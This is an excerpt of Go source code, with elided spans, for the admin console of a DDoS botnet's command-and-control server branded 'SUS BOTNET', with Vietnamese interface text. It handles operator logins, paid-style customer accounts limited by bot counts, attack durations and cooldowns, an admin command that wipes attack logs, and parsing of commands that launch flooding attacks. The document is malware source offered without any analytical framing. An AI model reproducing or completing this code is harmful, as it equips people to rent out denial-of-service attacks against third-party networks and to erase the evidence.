...
func (this *Admin) Handle() {
	...
	spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\x1b[0;36mLogin thành công \x1b[1;30m"), spinBuf[i % len(spinBuf)]))
    ...
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;36msai user vui lòng thử lại.\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    ...
    this.conn.Write([]byte("\x1b[0;36mSUS BOTNET\x1b[1;37m.\r\n"))
    this.conn.Write([]byte("\x1b[0;36mbản v5, methods xịn\x1b[1;37m.\r\n"))	
    this.conn.Write([]byte("\r\n\033[0m"))
    ...
    for {
        ...
        var botCount int
        this.conn.Write([]byte("\x1b[1;37m" + username + "\x1b[0;36m@\x1b[1;37mSUS \x1b[1;37m#~ \x1b[0;36m$ \033[0m"))
    ...
    this.conn.Write([]byte("\r\n\033[0m"))
        ...
        if userInfo.admin == 1 && cmd == "controlpanel" {
            this.conn.Write([]byte("SUS botnet Admin Commands:\r\n"))
        ...
        if cmd == "help" || cmd == "HELP" || cmd == "methods" { // display help menu
            ...
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(" \x1b[0;36mCách sài\x1b[1;37m:\r\n"))
        ...
        if userInfo.admin == 1 && cmd == "cleanlogs"  {
            this.conn.Write([]byte("\033[1;91mxóa logs attack\033[1;33m?(y/n): \033[0m"))
            ...
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mlỗi, ko thể xóa check lại logs debug \r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack logs đã bay màu !\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs đã clean bởi \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }
        ...
        if userInfo.admin == 1 && cmd == "remove" {
            ...
            if !database.removeUser(new_un) {
                this.conn.Write([]byte("ko có user trong database.\r\n"))
            } else {
                this.conn.Write([]byte("User đã xóa\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m nhập user cần tạo > Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m nhập mật khẩu > Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m nhập bot tối đa (-1 để full net): "))
            ...
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", " ko thể kiểm tra số lượng")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m số lượng tấn công tối đa (-1 cho ko có): "))
            ...
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 cho ko có): "))
            ...
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "ko thể thêm cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m info acc vừa tạo: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            ...
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                ...
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m tạo thành công.\033[0m\r\n"))
            }
            continue
        }
        ...
        if cmd[0] == '-' {
            ...
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mKhông thể phân tích số lượng bot \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mSố lượng Bot cần gửi lớn hơn mức tối đa cho phép của Bot\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        ...
        if err != nil {
            ...
            if err != nil {
                ...
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    ...
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mđang ddos!\r\n")))
                } else {
                    fmt.Println("bạn đã bị block bởi " + username + " vào danh sách bay acc")
                }
            }
        }
    }
